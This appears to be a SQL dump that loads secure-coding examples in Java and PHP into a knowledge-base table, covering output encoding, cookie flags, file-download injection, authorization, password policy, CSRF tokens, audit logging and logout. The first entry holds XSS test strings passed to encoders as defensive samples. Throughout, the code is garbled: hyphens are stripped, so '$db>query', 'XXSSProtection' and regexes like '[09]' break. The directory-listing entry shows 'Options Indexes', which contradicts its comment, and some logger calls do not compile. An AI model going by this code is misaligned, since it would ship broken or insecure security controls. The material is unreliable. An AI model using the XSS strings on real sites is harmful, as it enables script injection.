	String htmlbug = ESAPI.encoder().encodeForHTML("<script>alert(1337);</script>");

	/*
	This next encoding method is used for whenever you are allowing userinput into 
	html attributes.
	The attack below will now be outputted as:
	onload=&amp;39;alert(1337)&amp;39;
	*/
			
	String htmlatr = ESAPI.encoder().encodeForHTMLAttribute("onload=''alert(1337);''");
			
	/*
	Whenever parameters are rendered via javascript your application will detect normal injections
	in the first instant. in order for the application not to be vulnerable to javascript encoding you MUST use the encodeForJavaScript function, any other escaping function still leaves your code vulnerable
	*/	      

	ESAPI.encoder().encodeForJavaScript("\\x3Cscript\\x3Ealert(12);\\x3C\\x2Fscript\\x3E");
			
	/*
	Whenever a user can submit an link/A HREF in your application you must solely depend upon the
	"ESAPI.encoder().encodeForURL" method since an attacker could otherwise inject the href with an XSS
	that looks like this "javascript:alert("XSS");" whenever a victim now clicks the link this XSS
	will be executed in his browser.
	*/ 

	try {
		ESAPI.encoder().encodeForURL("javascript:alert(234);");
	} catch (EncodingException e) {
		logger.error("Error encoding characters : " + e.toString() + " Time : " + LocalDateTime.now());
	}

	/*
	Security consists of different layers of protection in order to guarantee the integrity
	of your application. This means that the value displayed from the database/user should
	already be sanitized before being processed in order to prevent XSS.

	As an example, what do you do when you expect a numeric value from your application?

	You first sanitize the user input by means of an input validation method like:
	See the "input validation" class for the entire example!
	*/
	InputValidation validate = new InputValidation();
	String userinput = "when this string is evil the application will block operation!";
	if(validate.validateInput(userinput, "numeric", "Unexpected user input", "HIGH", 3)== false)
	{ /* Cancel operation of your application */ }
			
	/*
	In this example the application cancelled the request by means of simple validation.
	*/
    


', 'HTML Output', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' HttpOnly flag


 Example:


    //If you''re using Servlets 3.0, you can actually instruct the app server to ensure that all session cookies are HttpOnly and Secure //with the following fragments:

    <sessionconfig>
      <cookieconfig>
        <secure>true</secure>
        <httponly>true</httponly>
      </cookieconfig>
    </sessionconfig>


    //httpOnly is supported as of Tomcat 6.0.19 and Tomcat 5.5.28.

    //See the changelog entry for bug 44382.

    //The last comment for bug 44382 states, "this has been applied to 5.5.x and will be included in 5.5.28 onwards." However, it does //not appear that 5.5.28 has been released.

    //The httpOnly functionality can be enabled for all webapps in conf/context.xml:

    <Context useHttpOnly="true">
    ...
    </Context>

    //  My interpretation is that it also works for an individual context by setting it on the desired Context entry in conf/server.xml // (in the same manner as above).

', 'HttpOnly flag', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session Cookies 


 Example:


    /*
    Setting the "Domain" attribute to a too permissive value, such as "example.com" 
    allows an attacker to launch attacks on the session IDs between different hosts and 
    web applications belonging to the same domain, known as crosssubdomain cookies.
    For example, vulnerabilities in www.example.com might allow an attacker to get access 
    to the session IDs from secure.example.com.
    */

    //This is apparently supported via a configuration setting in 6.0.27 and onwards:

    Configuration is done by editing METAINF/context.xml

    <Context sessionCookiePath="/something" sessionCookieDomain=".domain.tld" />
', 'Session cookies domain', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' RFD and file download injections


 Example:


    /*
    the following code snippet represents the jsf page used to download a file 

    <html xmlns="http://www.w3.org/1999/xhtml"
        xmlns:h="http://java.sun.com/jsf/html"
        xmlns:f="http://java.sun.com/jsf/core"
        xmlns:p="http://primefaces.org/ui"
        xmlns:cu="http://localhost:8080/custom"
        xmlns:ui="http://java.sun.com/jsf/facelets">

    <f:view contentType="text/html">
    <h:head>
        <h:outputStylesheet name="commonstyle.css" library="css" />
    </h:head>   
    <h:body>
        <div id="page">    
                <div id="header">
                <ui:insert name="header" >
                    <ui:include src="commonHeader.xhtml" />
                </ui:insert>
                    <img src="resources/images/skf.png"></img>
                </div>
                <p:separator style="border: 0px;"></p:separator>
        </div>
        
        <div id="content">      
            <ui:insert name="content" >
            <ui:include src="commonDownloadRFD.xhtml" />
            </ui:insert>      
            <p:dialog modal="true" widgetVar="statusDialog" header="Status" draggable="false" closable="false" resizable="false">
                <p:graphicImage name="/images/ajaxloadingbar.gif" />
            </p:dialog>
            
            <h:form>
                <p:commandButton value="Download" ajax="false" actionListener="{fileDownloadController.filedownload}" onclick="PrimeFaces.monitorDownload(start, stop);" icon="uiiconarrowthick1s">
                </p:commandButton>
                <p:spacer width="20" height="40" />
                <p:commandButton action="{navigationController.moveToMainMenu}" ajax="false" value="Main Menu" />    
            </h:form>
            
            <script type="text/javascript">
                    function start() {
                        PF(''statusDialog'').show();
                    }
                    
                    function stop() {
                        PF(''statusDialog'').hide();
                    }
            </script>
        </div>
    </h:body>
    </f:view>
    </html>

    */


    // The following bean represents the managed bean to perform the file download action   

    package prime.com.beans;

    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.io.OutputStream;
    import java.sql.Connection;
    import java.sql.PreparedStatement;
    import java.sql.ResultSet;
    import java.sql.SQLException;
    import java.time.LocalDateTime;
    import org.apache.log4j.Logger;
    import java.util.regex.Pattern;

    import javax.faces.application.FacesMessage;
    import javax.faces.bean.ManagedBean;
    import javax.faces.component.UIComponent;
    import javax.faces.context.ExternalContext;
    import javax.faces.context.FacesContext;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.servlet.annotation.MultipartConfig;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import javax.sql.DataSource;

    import com.Lib.AuditLog;
    import com.Lib.InputValidation;
    import com.Lib.WhiteList;
    

    @ManagedBean(name="fileDownloadController")
    @MultipartConfig
    public final class FileDownloader {
        
        // Applications are rarely tested for Unicode exploits, and yet many are vulnerable due to the same sort of issues which allows HTTP Request Smuggling to work – every browser, 
        // web server, web application firewall or HTTP inspection agent, and other device treats user locale handling in different (and usually confusing) manner.
        // Canonicalization deals with the way in which systems convert data from one form to another. 
        // Canonical means the simplest or most standard form of something. Canonicalization is the process of converting something from one representation to the simplest form.
        // Web applications have to deal with lots of canonicalization issues from URL encoding to IP address translation. 
        // When security decisions are made based on less than perfectly canonicalized data, the application itself must be able to deal with unexpected input safely. 
        
        final static Logger logger = Logger.getLogger(FileUploader.class);
        private AuditLog Log = new AuditLog(); 
        private WhiteList wl = new WhiteList();
        InputValidation validate = new InputValidation();
        private UIComponent component;
        private String file;
        private File fileplace;
        
        public FileDownloader() {        
            
            FacesContext context = FacesContext.getCurrentInstance();
            HttpServletRequest request = (HttpServletRequest)FacesContext.getCurrentInstance().getExternalContext().getRequest();
            HttpServletResponse response = (HttpServletResponse) FacesContext.getCurrentInstance().getExternalContext().getResponse();  
            
            // Unicode Encoding is a method for storing characters with multiple bytes. Wherever input data is allowed, 
            // data can be entered using Unicode to disguise malicious code and permit a variety of attacks. RFC 2279 references many ways that text can be encoded. 
            
            FacesContext.getCurrentInstance().getExternalContext().setResponseContentType("text/html;charset=UTF8");
            
            String action = ""; 
            boolean proceed = false ;
            String mimetype = "";
            
            // Create path components to save the file
            // The location of stored files should always be outside of your root
            file = "C:\\tsec.jpg";
            fileplace = new File(file); 
            
            String fileNameformat = fileplace.getName();
            
            String filenameparts[] = fileNameformat.split(Pattern.quote("."));
            String fileName = filenameparts[0];
            String afterdot = filenameparts[1];
            
            /*
            First we check if the value is alphanumeric only to prevent uploading out of intended directory, 
            as well as other injections
            */
            
            /* in normal situations the userID should be retrieved from session or from the web page made the request. 
            * For demonstration purposes we assume that the usedID is always 2, which indicated the Administration ID number. 
            */
            
            if (validate.validateInput("2", fileName, "alphanumeric", "validation failed",request.getRemoteAddr(),"HIGH") == "validation failed")
            {
            proceed = false;
            action = "validation failed";
            }
            
            else if (validate.validateInput("2", fileName, "alphanumeric", "Session Termination",request.getRemoteAddr(),"HIGH") == "terminate")
            {
                proceed = false;
                action = "terminate";
            }   
            
            else if (validate.validateInput("2", fileName, "alphanumeric", "Block access",request.getRemoteAddr(),"HIGH") == "block")
            {
                proceed = false;
                action = "block";
            }else{
                Log.SetLog("2", "Validated Successfully" , "SUCCESS", LocalDateTime.now(),request.getRemoteAddr(),  "");
                action = "Validated Successfully";
                proceed = true;
            }
            
            if (proceed == true)
            {
                //Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
                Connection conn = null;
                try {
                            
                    Context initContext = new InitialContext();
                    Context webContext  = (Context)initContext.lookup("java:/comp/env");
                    DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
                    conn = ds.getConnection();  

                    //Here we select the number of counts from aggregate column in order to verify the number of connections:
                    String query = "SELECT * FROM privileges WHERE privilegeID=?";
                
                    PreparedStatement st = conn.prepareStatement(query);
                    
                    /* in normal situations the privilegeID should be retrieved from database based on UserID retrieved from the active session 
                    * or from the web page made the request. 
                    * For demonstration purposes we assume that the privilegeID is always 1, which indicated the Administration privilege ID number. 
                    */
                    st.setString(1, "1");

                    // execute the query, and get a java result set
                    //We bind the parameter in order to prevent SQL injections
                    ResultSet rs = st.executeQuery();
                    
                    while (rs.next())
                    {
                        mimetype   = rs.getString("mimeType");
                    }
                    st.close();
                    conn.close();
                } catch (SQLException | NamingException e) {
                    logger.error("cannot read from database. check query :" e.toString());
                }     

                /*
                We also define the mimetype per download file.
                This is because whenever a user can only download images it is not necessary to set
                an uncommon contenttype header for it.
                NOTE: These mimetypes should not be stored based upon the mimetype which was send 
                the response header when the user uploaded the file. This value can be easily 
                manipulated with an intercepting PROXY. You should get the mimetype from the file
                itself after it was stored on the server.
                */
                response.reset();
                response.setContentType(mimetype);
                response.addHeader("CacheControl", "nocache");
                response.addHeader("ContentDisposition", "attachment; filename=" + fileName + "." + afterdot + ";");
                
                OutputStream out;
                try {
                    out = response.getOutputStream();
                    
                    FileInputStream in = new FileInputStream(fileplace);
                    byte[] buffer = new byte[4096];
                    int length;
                    while ((length = in.read(buffer)) > 0){
                        out.write(buffer, 0, length);
                    }
                    in.close();
                    out.flush();   
                } catch (IOException e) {
                    logger.error("Cannot download file  " e.toString());
                }
            }
            else if (file == null)
            {
                action = "empty";
            }
            
            if (action.equals("terminate"))
            {
                request.getSession().invalidate();
                request.setAttribute("msg","Session terminated! file has not been downloaded");             
                ExternalContext ec = FacesContext.getCurrentInstance().getExternalContext();
                try {
                    ec.redirect(ec.getRequestContextPath() + "/Menu.xhtml");
                } catch (IOException e) {
                    logger.error("Cannot redirect  " e.toString());
                }
            }
            if (action.equals("validation failed"))
            {
                request.getSession().invalidate();
                context.addMessage(component.getClientId(), new FacesMessage(FacesMessage.SEVERITY_ERROR, "FAIL!", "Session terminated! file has not been downloaded"));
            }
            if (action.equals("block"))
            { 
                request.getSession().invalidate();          
                context.addMessage(component.getClientId(), new FacesMessage(FacesMessage.SEVERITY_ERROR, "FAIL!", "Session terminated with Blocked Access! file has not been downloaded"));
            }
            if (action.equals("Validated Successfully"))
            {
                context.addMessage(component.getClientId(), new FacesMessage(FacesMessage.SEVERITY_ERROR, "SUCCESS!", "file downloaded"));   
            }
        }
        
        public String getFile() {
            return file;
        }

        public void setFile(String file) {
            this.file = file;
        }

        public void fixedDownloads(String file, String download, HttpServletResponse response)
        {
            /*
            The second example is for whenever you are providing users with fixed downloads
            such as manuals etc. We do not only check if the file just exists, because that would
            allow an attacker to also download important other files from your server, so instead
            we whitelist them.
            */
            if (wl.WhiteListing(file, download) != false)
            {
                response.reset();
                response.setContentType("text/plain");
                response.addHeader("CacheControl", "nocache");
                response.addHeader("ContentDisposition", "attachment; filename=" + file + ";");
                
                OutputStream out;
                try {          
                    out = response.getOutputStream();
                    FileInputStream in = new FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int length;
                    while ((length = in.read(buffer)) > 0){
                        out.write(buffer, 0, length);
                    }
                    in.close();
                    out.flush();
                } catch (IOException e) {
                    logger.error("Cannot download file  " e.toString());
                }   
            }   
        }
    }

', 'RFD and file download injections', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Identifierbased authorization


 Example:


	package com.edw;

	import java.sql.Connection;
	import java.sql.PreparedStatement;
	import java.sql.ResultSet;
	import java.sql.SQLException;
	import java.time.LocalDateTime;

	import javax.naming.Context;
	import javax.naming.InitialContext;
	import javax.naming.NamingException;
	import javax.sql.DataSource;

	import org.apache.log4j.Logger;

	public final class IdentifierBased {

		private int userID;
		private String name;
		private String email;
		private String phone;
		final static Logger logger = Logger.getLogger(IdentifierBased.class);
		/*
		First we include the audit log class.
		For more detailed information see the Auditlog code example
		*/
		AuditLog Log = new AuditLog();
		
		/*
		We then do the same for aggregate user controls.
		For more detailed information see the Aggregate user control code example
		*/
		Aggregate aggregate =  new Aggregate();
		
		InputValidation validate = new InputValidation();
		
		/* 
		the following function return a String value that informs the appropriate 
		SERVLET to take actions such as terminate the session or take logs about 
		a certain action such as user blocking
		The following SERVLET is an example of such behavior
		
		* protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
		{
			userID = request.getParameter("userID");
			name = request.getParameter("User");
			
			IdentifierBased au = new IdentifierBased() ;
			String auth = au.IdentifierBasedAuthentication(pageID, userID, name);
			
			if (auth.equals("terminate"))
			{
				request.getSession().invalidate();
				request.setAttribute("msg","FAIL! Session terminated!");
				request.getRequestDispatcher("/login.jsp").forward(request, response);
				return;
			}
			
			else if (auth.equals("block"))
			{
				request.getSession().invalidate();
				request.setAttribute("msg","FAIL! User Blocked!");
				request.getRequestDispatcher("/login.jsp").forward(request, response);
				return;
			}
		}	
		* 
		* 
		*/
		
		public String IdentifierBasedAuthentication(int pageID, String user_id, String username)
		{	
			String page  = new Integer(pageID).toString();
			String identifier = "null" ; 
			/*
			First we validate if the incoming value is in fact an integer since we expect a page id number.
			If the incoming value is not a number we lockout the users since he tries to manipulate application operation.
			*/

			boolean doFunction = true;
			//see the "input validation" code example for more detailed information about this function
			if (validate.validateInput("", page, "numeric", "Failed to get file", "HIGH") == false) { doFunction = false; }
			
			if (doFunction == false)
			{
				//First we log the fact we detected a tampering in the application operation
				Log.SetLog(user_id, "User tried to manipulate application operation", "FAIL", LocalDateTime.now(),"","HIGH");

				/*
				Set counter; if counter hits 3, the user''s session must be terminated.
				After 3 session terminations the user''s account must be blocked. 
				Given the high threat level, there will be immediate session termination.
				*/
				String validation = Log.counter(3);	
				
				//the following values will be used from the SERVLET in order to handle session terminations or user blocking 
				if (validation.equals("SQL insert query error in update access" )){
						Log.SetLog(user_id, "" , "SQL insert query error in update access", LocalDateTime.now(),"",  "");
				}
				if (validation.equals("block")){
					Log.SetLog(user_id, "" , "block", LocalDateTime.now(), "",  "HIGH");
					identifier = "block";
				}
				if (validation.equals("terminate")){
					Log.SetLog(user_id, "" , "terminate", LocalDateTime.now(), "",  "HIGH");
					identifier = "terminate";
				}
			}
			
			if (doFunction == true)
			{
				//the page retrieval has to be reported into the log files
				Log.SetLog(user_id, "Connection to the database was made successfully", "SUCCESS", LocalDateTime.now(),"","");

				//We also count the connection to the database.
				aggregate.aggregateControl(1,username , user_id);

				/* 
				Whenever you are checking whether a user is restricted to review certain data,
				the access restrictions should be processed from the server.
				
				The userID could be stored inside a session variable on login, and should
				be used to retrieve user data from the database when requested
				
				in order to verify if the user is allowed to look into that data:
				*/

				//Here we connect to the database by means of a connection string as configured in the web.xml and /METAINF/context.xml 
				Connection conn = null;
					try {
		
						Context initContext = new InitialContext();
						Context webContext  = (Context)initContext.lookup("java:/comp/env");
						DataSource ds = (DataSource)webContext.lookup("jdbc/myJdbc");
						conn = ds.getConnection();	
						
						//We also count the connection to the database.
						aggregate.aggregateControl(1,username , user_id);
					
						/* Here we select the users privilege level from the users table */
						String query = "SELECT * from profile WHERE userID = ? ";
					
						//execute the query, and get a java result set
						//We bind the parameter in order to prevent SQL injections
						PreparedStatement st = conn.prepareStatement(query);
						st.setInt(1, userID);
						
						//Next we read the value from the database and put it into a variable
						ResultSet rs = st.executeQuery();
						
						while (rs.next())
						{
							name  = rs.getString("name");
							email = rs.getString("email");
							phone = rs.getString("phone");
						}
						
						st.close();
						conn.close();
				
					} catch (SQLException | NamingException e) {
						logger.error("cannot search database. check query" + e.toString() );
					}
			
				this.setEmail(email);
				this.setName(name);
				this.setPhone(phone);
			}
			return identifier;
		}

		public String getName() {
			return name;
		}

		public void setName(String name) {
			this.name = name;
		}

		public String getEmail() {
			return email;
		}

		public void setEmail(String email) {
			this.email = email;
		}

		public String getPhone() {
			return phone;
		}

		public void setPhone(String phone) {
			this.phone = phone;
		}
	}
    ', 'Identifier based authorization', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XXSSProtection header


 Example:


    <?php

    //In order to set the XXSSProtection header, you''ll have to add the following code to the head of your application:
    header("XXSSProtection:1; mode=block");

    ?>
', 'X XSS Protection header', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce secure passwords


 Example:


    <?php

	class passwordPolicy{
		public function createPassword($pwd){
			$proceed = true;

			//Recommended to use a small phrase instead of a password:
			if(strlen($pwd) < 8 ){
				$error .= "Password too short!";
				$proceed = false;
			}

			$pattern = array("/[09]+/","/[az]+/","/[AZ]+/","/\W+/");		

			/*
			The password should include at least one number, a small letter, a CAPS,
			and a special character as defined in the patterns array:
			*/
			foreach($pattern as $value){
				if(!preg_match($value, $pwd)){
					$error .= "Password incomplete";
					$proceed = false;
				}
			}

			/*
			Even though your password is sufficient according to all your standards, the password could still be weak.
			Just imagine the password "Password!"; this could easily be guessed by an attacker. To prevent the use of weak passwords we
			compare the password with a list of top 500 bad passwords and if matched, the password wil be rejected:
			*/
			$file = file_get_contents(''badpasswords.txt'');

			$pattern = explode('','', $file);

			foreach($pattern as $password){
				if(preg_match($password, $pwd)){
					$error .= "Your password was matched with the bad password list, please try again.";
					$proceed = false;
				}
			}

			if($proceed == true){
				echo "Your password is allowed!";
				return true;
			}else{
				echo "Password validation failure(your choice is weak): $error";
				return false
			}				
		}
	}
			
    ?>
', 'Enforce secure passwords', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reauthentication


 Example:


    <?php

	/*
	Whenever a user wants to change his credentials or do other important data exchanges such as
	transferring money he should always be challenged to reauthenticate himself before
	allowing them to perform these actions.
	*/

	class challengeUser{
			public function reauthenticate($password){

			//init DB connection
			include("classes.php");
			$con     = new database();
			$logging = new logging();

			$db = con>connection();

			//PDO prepared statement in order to prevent SQL injections        
			$stmt = $db>query("SELECT * FROM members WHERE id = :userID ");

			//We than bind the parameters in order to prevent SQL injection;
			$stmt>execute(array('':userID''=>$_SESSION[''userID''] ));


			$loginUser = $stmt>fetchAll(PDO::FETCH_ASSOC);

			/*
			Than we validate the password, if the validation is true than we set the sessions
			For more detailed information on password validation check please look into the
			Password storage(salting/stretching/hashing) in the knowledgebase for more information.
			*/
			if($this>ValidatePassword($loginUser[''password''], $password) === true){

				//After successful validation we want to log that Password was validated successfully:
				setLog($_SESSION[''userID''],"Password return true", "SUCCESS", date(ddmmyyyy), $privilege, "NULL");

				session_start();

				//Change the session id on login
				session_regenerate_id(true);

				//Here we set a session to see if the user is authenticated throughout the system
				$_SESSION[''access'']   = "active";

				/*
				The userID in a session variable to use as an identifier to prevent a user reading
				into unauthorized data, See Identifierbased authorization for more information and
				code examples.
				*/

				$_SESSION[''userID'']   = $loginUser[''id''];

				//The CSRF token is set here by an approved random number generator
				$_SESSION[''csrf''] = base64_encode(openssl_random_pseudo_bytes(128));

				//if all is ok we return loginUser values
				return true;

			}else{

				//The user failed reauthenticating himself
				$logging>setLog($_SESSION[''userID''],"Reauthentication failed", "FAIL", date("dmy"), "null", "MOD");

				//If the authentication fails we destroy the session
				session_start();
				session_destroy();

				//Regenerate the session ID to lock out an attacker!
				session_regenerate_id(true);
				$_SESSION[''active''] = "";

				header("location:login.php");

				die();           	
			}
		}
	}

	/*
	Before we let a user perform certain actions he should first be challenged to authenticate
	himself. imagine the following scenario, the user wants to change his email address.
	*/

	$challenge =  new challengeUser()
	if($challenge>reauthenticate() !== true){

		echo "please reauthenticate yourself";
		echo
		"
		<form method=''post''>
		<input type=''password'' name=''password''/>
		<input type=''submit'' name=''authenticate''/>
		</form>		
		";

	}else{

		//Do operation for changing the email address
		echo "You can now change your email address!";
	}

    ?>
', 'Re authentication', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XSL injection prevention


 Example:


    <?php

	/*
	In order to prevent XSL injections you must enforce strict policy''s whenever the
	files are loaded from a source controlled by an possible attacker.

	Let''s say for example that the user can choose from several XSL files on your application.

	ABC.xsl arranges your employee names on alphabetical order
	CBA.xsl does not care and just shows the input by order of your XML file.

	Before we want to attach the XSL files to the style sheet we first want to
	do validation on the request to make sure the included file was one of our own pre
	defined files, example:
	including("file1.xsl,file2.xsl,etc", $_GET[''xslfile''], "3")
	*/

	class includeXSL{
		public function including($whiteListing, $inputParam, $countLevel){

			//Include the classes of which you want to use objects from
			include_once("classes.php");

			$whitelist = new whitelisting();

			$continue = true;

			/*
			We want to whitelist the paged for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			*/
			if($whitelist>checkpattern($whiteListing, $inputParam, $countLevel) == false)
			{$continue = false;}

			//If all went good we do the function
			if($continue == true){
				 LOAD XML FILE
				// Load the XML source
				$xml = new DOMDocument;
				$xml>load(''test.xml'');

				$xsl = new DOMDocument(''1.0'',''UTF8'');
				$xsl>load($inputParam);

				// Configure the transformer
				$proc = new XSLTProcessor;
				$proc>importStyleSheet($xsl); // attach the xsl rules

				echo $proc>transformToXML($xml);
			}
		}
	}

    ?>
', 'XSL injection prevention', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies (domain)


 Example:


    <?php

	/*
	Whenever a session is started, and you want to share it over different domains,
	the domain value should be set to the specific domain:
	*/

	public function sessionStart(){

		$lifetime = 3600;
		$path     = "/";
		$domain   = "demo.yourdomain.com";  // <  the Configure domains, do not use .yourdomain.com (wildcard) this increases the attack surface!

		$secure   = 0;
		$httponly = true;

		session_set_cookie_params($lifetime, $path, $domain, $secure, $httponly);
	}

	?>
', 'Session cookies (domain)', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory listing


 Example:


    <?php

	/*
	To disable or prevent directory access, add following line in your .htaccess file. If
	user points the browsers to a directory that does not have an index file, then a
	"403 Forbidden" error will be displayed:

	Add this line of code to your .htaccess file:
	*/

	Options Indexes

	?>
', 'Directory listing', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reflective file download and file download injection prevention


 Example:


	<?php

	//include all necessary classes
	include_once("class/classCollect.php");

	class fileDownload{
		/*
		The first example we cover how to download files which users can upload
		themselves on the web application
		*/

		public function downloadUserFiles($fileID){		

			$conn = new NewDatabase();
			$db   = $conn > connection();
			$validation = new validation();
			$proceed = true;

			/*
			For the sake of example we only allow the users to download their own files
			by identifier based sql query''s. As you can see we select the filename
			by its id. in this case we prevent direct user input into the disposition header.
			*/

			if($validation>inputValidation($fileID, "numeric", "validate was false", "HIGH", 3) == false){
				$proceed = false;
			}

			if($proceed == true){
				$stmt = $db>prepare("SELECT * FROM download WHERE fileID=? AND userID=?");
				$stmt>execute(array($fileID, $_SESSION[''userID'']));
				$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

				foreach($rows as $row){
					$filename = $row[''fileName''];
					$mimeType = $row[''mimeType''];
				}

				if($filename){
				/*
				We also define the mimetype per download file.
				This is because whenever a user can only download images it is not necessary to set
				an uncommon contenttype header for it.
				NOTE: These mimetypes should not be stored based upon the mimetype which was send
				the response header when the user uploaded the file. This value can be easily
				manipulated with an intercepting proxy. You should get the mimetype from the file
				itself after it was stored on the server.
				*/
				header(''ContentDescription: File Transfer'');
    			header("contenttype:".$mimeType."");
    			header(''ContentDisposition: attachment; filename=''.$filename);
    			header(''Expires: 0'');
				header("CacheControl: nostore, nocache, mustrevalidate, maxage=0");
				header("CacheControl: postcheck=0, precheck=0", false);
				header("Pragma: nocache");    
				header(''ContentLength: '' . filesize($filename));
				//Last check to see if it really does exist.
				if(file_exists($filename)){
					readfile($filename);
				}
				/*
				Exit is very important, if other mechanims fail this makes sure the rest
				of the page plus attack string does not get downloaded anyways.
				*/
				exit;
				}
			}
		}

		/*
		The second example is for whenever you are providing users with fixed downloads
		such as manuals etc. We do not only check if the file just exists, because that would
		allow an attacker to also download important other files from your server, so instead
		we whitelist them.
		*/
		public function downloadStored($filename){

			$white = new whitelisting();

			if($white > checkpattern("file1.txt,file2.txt", $filename, 3) != false){
				header(''ContentDescription: File Transfer'');
    			header(''ContentType: text/plain'');
    			header(''ContentDisposition: attachment; filename=''.$filename);
    			header(''Expires: 0'');
				header("CacheControl: nostore, nocache, mustrevalidate, maxage=0");
				header("CacheControl: postcheck=0, precheck=0", false);
				header("Pragma: nocache");    
				header(''ContentLength: '' . filesize($filename));
				if(file_exists($filename)){
					readfile($filename);
				}
				/*
				Exit is very important, if other mechanims fail this makes sure the rest
				of the page plus attack string does not get downloaded anyways.
				*/
				exit;
			}
		}
	}

	?>
', 'RFD and file download injection prevention', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XContentTypeOptions header


 Example:


    <?php

    //In order to set the "XContentTypeOptions" header you''ll have to add the following code to the head of your application:
    header(''XContentTypeOptions: nosniff'');

    ?>
', 'X Content Type Options header', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Audit logs


 Example:


    <?php

	/*
	The log function does not have to be complicated as long as you log at least these 6 values

	Whenever a user is registered or added to your system, the application must also
	automatically generate a table for this user which contains his userID, counter and blocker
	variable in order to keep track of his behavior.
	*/

	class logging{
		public function setLog($userID, $errorMessage, $value, $date, $privilege, $threat){

			//Save log file in a directory which has restrictions in place so no one can access it easily
			$myFile = "restrictedfolder/logfile.txt";

			$fh = fopen($myFile, ''a+'') or die("can''t open file");

			//Notice how we user the userID instead of the actual username in order to prevent the integrity of these usernames
			//should an attacker ever gain access to these log files
			$stringData = $date." ".$userID." ".$errorMessage." ".$value." ".$privilege." ".$threat." \n" ;

			fwrite($fh, $stringData);
			fclose($fh);
		}

		public function setCounter($count){

			include("classes.php");

			//init DB connection
			$con  = new database();
			$db = $con>connection();


			//Here we select all data to verify if the users session should be terminated or his account should be lockedout
			$stmt = $db>prepare("SELECT count, blocker FROM counter WHERE userID=:id");
			$stmt>execute(array($_SESSION[''userID'']));
			$row = $stmt>fetchAll(PDO::FETCH_ASSOC);

			foreach($row as $rows){

				//First we update the count/blocker variable with the old values for the update
				$dbCount   = $rows[''count''];
				$dbBlocker = $rows[''blocker''];

			}

			$countUpdate   = $count + $dbCount;
			$blockerUpdate = $count + $dbBlocker;

			//Here we want to set a counter for whenever a user attacks the application so we can lockout his account
			//when there are to many violations registered.
			$stmt = $db>prepare("UPDATE counter SET count=?, blocker=? WHERE userID=?");
			$stmt>execute(array($countUpdate, $blockerUpdate, $_SESSION[''userID'']));
			$affected_rows = $stmt>rowCount();

			//If the users counter was bigger than three his session should be terminated
			if($countUpdate >= 3){

				//Log that the users sessions have been terminated:
				setLog($_SESSION[''userID''],"The users session was terminated", "SUCCESS", date(ddmmyyyy), $privilege, "NULL");

				//Clear the session variable to deny access
				$_SESSION[''accessor''] = "";
				session_start();
				session_destroy();

				$countUpdate = 0;
			}


			//If the users counter was bigger than three his session should be terminated
			if($blockerUpdate >= 12){

				//Log that the users has been denied access to system:
				setLog($_SESSION[''userID''],"The users is denied access to system", "SUCCESS", date(ddmmyyyy), $privilege, "NULL");

				//If the blocker was bigger than 12 it means the user has made three strikes and his account should blocked
				$status = "blocked";
				$stmt = $db>prepare("UPDATE users SET status=? WHERE userID=?");
				$stmt>execute(array($status, $_SESSION[''userID'']));
				$affected_rows = $stmt>rowCount();

				//Clear the session variable to deny further access
				$_SESSION[''accessor''] = "";
				session_start();
				session_destroy();
			}

			//After the counter has terminated a session he should be set to zero again
			$stmt = $db>prepare("UPDATE counter SET count=? WHERE userID=?");
			$stmt>execute(array($countUpdate, $_SESSION[''userID'']));
			$affected_rows = $stmt>rowCount();

		}
	}
	
  	?>
', 'Audit logs', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' CSRF tokens


 Example:


	<?php

	class CSRF{

		public function generateToken(){
			/*
			After successful user authentication, the application must start a session
					which contains the "Cross Site Request Forgery(CSRF)" token.
			*/

			$_SESSION[''csrf''] = base64_encode(openssl_random_pseudo_bytes(128));
		}

		/*

		The random CSRF token generated need to be send to the server with every form submission.
		This token is included in a form as a HTML hidden form field parameter. When the form is
		submitted the token value is also submitted along with it.

		The token is then validated against the csrf token which was generated during user authentication.
		Below code demonstrate the validation of csrf token at the server side:

		*/

		protected function _checkCsrf($token){        
			session_start();                    

			if($_SESSION[''csrf''] != $token){        

				//Log the invalid token verification
				setLog($_SESSION[''userID''],"invalid CSRF token send!", "FAIL", date("dmy"), $_SESSION[''privilege''], "HIGH");

				//If the token was not valid we terminate the users session
				session_start();
				session_destroy();                   

				//The die function is to make sure the rest of the php code is not executed beyond this point
				die();        
			}    
		}  
	}   
	?>
', 'CSRF tokens', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Logout function


 Example:


	<?php

	/*
	This way, the logout functionality will revoke the complete session:
	*/

	public function deleteLogin(){

		//We first want to log the user logging out.
		setLog($_SESSION[''userID''],"User logout", "SUCCESS", date("dmy"), $_SESSION[''privilege''], "NULL");

		//We empty his authentication session
		$_SESSION[''Authenticated''] = "";

		//Than we destroy the entire session
		session_start();
			session_regenerate_id(true);
		session_destroy();
	}

	?>
', 'Logout function', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Timeout a session


 Example:


    <?php

	public function sessionStart(){

